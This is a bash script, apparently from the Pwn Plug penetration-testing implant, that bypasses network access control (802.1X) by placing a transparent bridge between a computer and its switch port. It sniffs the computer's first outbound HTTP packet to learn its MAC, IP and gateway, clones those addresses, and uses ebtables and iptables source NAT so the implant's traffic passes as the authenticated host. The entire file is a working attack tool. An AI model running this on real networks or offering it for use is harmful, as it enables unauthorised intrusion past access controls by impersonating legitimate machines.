#!/bin/bash
# Revision 3.29.2012 

# Define variables
BRINT=br0
SWINT=eth0
COMPINT=eth1
SWMAC=`ifconfig $SWINT | grep -i hwaddr | awk '{ print $5 }'`
BRIP=169.254.66.66
RANGE=61000-62000

# Wait for other startup items to finish
sleep 10

# Stop services
killall dhclient
killall dhclient3
killall -9 ruby
/etc/init.d/cron stop
/etc/init.d/ssh stop

# Clear resolv.conf
cp /dev/null /etc/resolv.conf

# Purge existing/duplicate default routes/bridges
route del default gw 0.0.0.0
route del default gw 0.0.0.0
route del default gw 0.0.0.0
ifconfig br0 down
brctl delbr br0

# Flush iptables NAT rules
iptables -t nat --flush

# Create bridge interface
brctl addbr $BRINT

# Add client-side interface to bridge
brctl addif $BRINT $SWINT

# Add switch-side interface to bridge
brctl addif $BRINT $COMPINT

# Assign temporary MAC to $BRINT
macchanger -m $SWMAC $BRINT

# Disable bridge-utils Multicast/IGMP snooping 
echo "0" > /sys/devices/virtual/net/br0/bridge/multicast_snooping

# Bring up client-side interface (no IP assignment)
ifconfig $COMPINT 0.0.0.0 up -arp

# Bring up switch-side interface (no IP assignment)
ifconfig $SWINT 0.0.0.0 up -arp

# Bring up bridge interface
ifconfig $BRINT $BRIP up promisc -arp

# Pick variables out of first outbound HTTP packet
tcpdump -nnei eth1 -c1 tcp dst port 80 |awk '{print$2","$4$10}' |cut -f 1-4 -d '.' > /var/pwnplug/script_configs/nacbypass_tmp
COMPMAC=`awk -F',' '{print$1}' /var/pwnplug/script_configs/nacbypass_tmp`
GWMAC=`awk -F',' '{print$2}' /var/pwnplug/script_configs/nacbypass_tmp`
COMPIP=`awk -F',' '{print$3}' /var/pwnplug/script_configs/nacbypass_tmp`

# Alternative - pick variables out of DHCP respone packet
#tcpdump -nnvvi eth0 -s0 -c1 udp dst port 68 > dhcp-reply
#COMPIP=`grep "Your-IP" dhcp-reply |awk '{print$2}'`
#COMPMAC=`grep "Client-Ethernet-Address" dhcp-reply |awk '{print$2}'`
#LOCMASK=`grep "Subnet-Mask" dhcp-reply |awk -F': ' '{print$2}'`
#DEFGW=`grep "Default-Gateway" dhcp-reply |awk -F': ' '{print$2}'`
#DNSSVR=`grep "Domain-Name-Server" dhcp-reply |awk -F': ' '{print$2}'`

# Add default route
#route add default gw $DEFGW

# Source NAT for packets leaving $SWINT/$BRINT
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

# Add a static arp entry four our bogus default gateway
arp -s -i $BRINT 169.254.66.1 $GWMAC

# Add our default gateway
route add default gw 169.254.66.1

# Add iptables NAT rules
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMPIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMPIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMPIP

# Re-enable arping on all interfaces
ifconfig $BRINT arp
ifconfig $COMPINT arp
ifconfig $SWINT arp

# Re-start SSHd/cron
/etc/init.d/ssh start
/etc/init.d/cron start
